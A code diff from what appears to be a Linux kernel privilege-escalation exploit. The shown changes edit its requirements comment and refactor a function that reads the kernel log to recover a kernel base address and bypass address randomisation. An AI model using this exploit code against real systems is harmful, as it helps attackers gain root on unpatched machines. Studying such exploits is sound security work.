@@ -5,8 +5,7 @@
 //
 // Requires:
 // - kernel.unprivileged_userns_clone = 1; (Default on Ubuntu systems)
-// - kernel.dmesg_restrict = 0 (Default on Ubuntu systems);
-//   or CAP_SYSLOG capabilities.
+// - kernel.dmesg_restrict = 0; or CAP_SYSLOG capabilities.
 //
 // Based on trigger PoC code by Denis Andzakovic:
 // https://lists.openwall.net/netdev/2017/12/04/40
@@ -86,25 +85,25 @@ int mmap_syslog(char **buffer, int *size) {
 }
 
 unsigned long search_dmesg(char *needle) {
+  char *addr_buf;
+  char *substr;
   char *syslog;
+  char *endptr;
   int size;
-  const int addr_len = 16; /* 64-bit */
   unsigned long addr = 0;
 
   if (mmap_syslog(&syslog, &size))
     return 0;
 
-  char *substr = (char *)memmem(&syslog[0], size, needle, strlen(needle));
+  substr = (char *)memmem(&syslog[0], size, needle, strlen(needle));
   if (substr == NULL)
     return 0;
 
-  char *addr_buf;
   addr_buf = strstr(substr, "<ffffffff");
   if (addr_buf == NULL)
     return 0;
 
-  char *endptr = &addr_buf[addr_len];
-  addr = strtoul(&addr_buf[1], &endptr, 16);
+  addr = strtoull(&addr_buf[1], &endptr, 16);
 
   if (addr > KERNEL_BASE_MIN && addr < KERNEL_BASE_MAX)
     return addr;
